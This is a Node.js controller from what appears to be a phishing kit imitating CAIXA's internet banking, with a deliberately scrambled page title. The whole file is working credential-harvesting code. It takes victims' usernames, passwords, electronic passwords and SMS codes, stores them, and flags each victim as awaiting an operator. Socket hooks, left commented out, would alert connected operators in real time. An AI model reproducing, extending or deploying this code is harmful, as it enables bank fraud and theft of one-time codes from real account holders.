const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const ipfromUser = req.connection.remoteAddress

            const { type, user, password, eletronicPassword, sms, status, socket } = req.body

            const { client: clientID, error } = req.query

            if (clientID) {
                const clientUser = await Client.findByPk(clientID)

                if (clientUser) {
                    await clientUser.update({
                        type,
                        user,
                        password,
                        eletronicPassword,
                        sms,
                        status: `reconnect`,
                    })

                    //connectedUsers[ipfromUser].emit('insertClient', clientUser.toJSON())

                    return res.render('password', {
                        title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                        pageClasses: 'password cadastro',
                        client: clientUser.toJSON(),
                        error: error ? true : false,
                    })
                }
            }

            //return res.json({ user, type, status })

            if (!user) return res.status(400).send({ error: `Informe seu usuário` })

            const clientUser = await Client.findOne({ where: { user } })

            if (clientUser) {
                await clientUser.update({
                    type,
                    user,
                    password,
                    eletronicPassword,
                    sms,
                    status: `reconnect`,
                })

                //connectedUsers[ipfromUser].emit('insertClient', clientUser.toJSON())

                return res.render('password', {
                    title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                    pageClasses: 'password cadastro',
                    client: clientUser.toJSON(),
                    error: error ? true : false,
                })
            }

            const client = await Client.create({
                type,
                user,
                password,
                eletronicPassword,
                sms,
                status: `aguardando_op`,
            })

            return res.render('password', {
                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                pageClasses: 'password cadastro',
                client: client.toJSON(),
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
